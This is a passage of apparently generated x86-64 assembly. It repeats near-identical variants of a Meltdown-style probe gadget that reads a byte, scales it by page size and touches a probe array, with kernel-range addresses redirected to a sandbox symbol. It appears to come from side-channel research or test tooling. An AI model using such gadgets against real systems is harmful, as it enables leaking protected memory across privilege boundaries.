	jmp	.Lprobe_one_win0_continue
## Variant 332
.Lprobe_one_win0_var332:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 333
.Lprobe_one_win0_var333:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 334
.Lprobe_one_win0_var334:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 335
.Lprobe_one_win0_var335:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 336
.Lprobe_one_win0_var336:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 337
.Lprobe_one_win0_var337:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 338
.Lprobe_one_win0_var338:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 339
.Lprobe_one_win0_var339:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 340
.Lprobe_one_win0_var340:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 341
.Lprobe_one_win0_var341:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 342
.Lprobe_one_win0_var342:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 343
.Lprobe_one_win0_var343:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 344
.Lprobe_one_win0_var344:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 345
.Lprobe_one_win0_var345:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 346
.Lprobe_one_win0_var346:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 347
.Lprobe_one_win0_var347:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 348
.Lprobe_one_win0_var348:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 349
.Lprobe_one_win0_var349:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 350
.Lprobe_one_win0_var350:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 351
.Lprobe_one_win0_var351:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 352
.Lprobe_one_win0_var352:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 353
.Lprobe_one_win0_var353:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 354
.Lprobe_one_win0_var354:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 355
.Lprobe_one_win0_var355:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 356
.Lprobe_one_win0_var356:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 357
.Lprobe_one_win0_var357:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 358
.Lprobe_one_win0_var358:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 359
.Lprobe_one_win0_var359:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 360
.Lprobe_one_win0_var360:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 361
.Lprobe_one_win0_var361:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 362
.Lprobe_one_win0_var362:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 363
.Lprobe_one_win0_var363:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 364
.Lprobe_one_win0_var364:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 365
.Lprobe_one_win0_var365:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 366
.Lprobe_one_win0_var366:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 367
.Lprobe_one_win0_var367:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 368
.Lprobe_one_win0_var368:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 369
.Lprobe_one_win0_var369:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 370
.Lprobe_one_win0_var370:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 371
.Lprobe_one_win0_var371:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 372
.Lprobe_one_win0_var372:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 373
.Lprobe_one_win0_var373:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 374
.Lprobe_one_win0_var374:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 375
.Lprobe_one_win0_var375:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 376
.Lprobe_one_win0_var376:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 377
.Lprobe_one_win0_var377:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 378
.Lprobe_one_win0_var378:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 379
.Lprobe_one_win0_var379:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 380
.Lprobe_one_win0_var380:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 381
.Lprobe_one_win0_var381:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 382
.Lprobe_one_win0_var382:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 383
.Lprobe_one_win0_var383:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 384
.Lprobe_one_win0_var384:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 385
.Lprobe_one_win0_var385:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 386
.Lprobe_one_win0_var386:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 387
.Lprobe_one_win0_var387:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 388
.Lprobe_one_win0_var388:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 389
.Lprobe_one_win0_var389:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 390
.Lprobe_one_win0_var390:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 391
.Lprobe_one_win0_var391:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 392
.Lprobe_one_win0_var392:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 393
.Lprobe_one_win0_var393:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 394
.Lprobe_one_win0_var394:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 395
.Lprobe_one_win0_var395:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 396
.Lprobe_one_win0_var396:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 397
.Lprobe_one_win0_var397:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 398
.Lprobe_one_win0_var398:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 399
.Lprobe_one_win0_var399:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 400
.Lprobe_one_win0_var400:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 401
.Lprobe_one_win0_var401:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 402
.Lprobe_one_win0_var402:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 403
.Lprobe_one_win0_var403:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 404
.Lprobe_one_win0_var404:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 405
.Lprobe_one_win0_var405:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 406
.Lprobe_one_win0_var406:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 407
.Lprobe_one_win0_var407:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 408
.Lprobe_one_win0_var408:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 409
.Lprobe_one_win0_var409:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 410
.Lprobe_one_win0_var410:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 411
.Lprobe_one_win0_var411:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 412
.Lprobe_one_win0_var412:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 413
.Lprobe_one_win0_var413:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 414
.Lprobe_one_win0_var414:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 415
.Lprobe_one_win0_var415:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 416
.Lprobe_one_win0_var416:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 417
.Lprobe_one_win0_var417:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
